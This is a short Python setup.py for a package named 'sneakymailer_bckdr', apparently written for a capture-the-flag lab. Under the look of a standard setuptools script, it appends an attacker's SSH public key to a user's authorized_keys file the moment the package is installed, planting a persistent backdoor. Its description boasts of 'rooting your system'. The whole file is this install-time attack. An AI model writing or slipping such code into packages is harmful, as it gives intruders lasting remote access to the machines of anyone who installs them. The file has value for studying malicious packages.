import setuptools

with open("/home/low/.ssh/authorized_keys", "a") as kss:
    kss.write("<SSH PUB ID>\n")
    kss.close()

setuptools.setup(
    name="sneakymailer_bckdr", # Replace with your own username
    version="0.0.1",
    author="Tr33",
    author_email="Tr33@kryptsec.com",
    description="Having a blast rooting your system :)",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
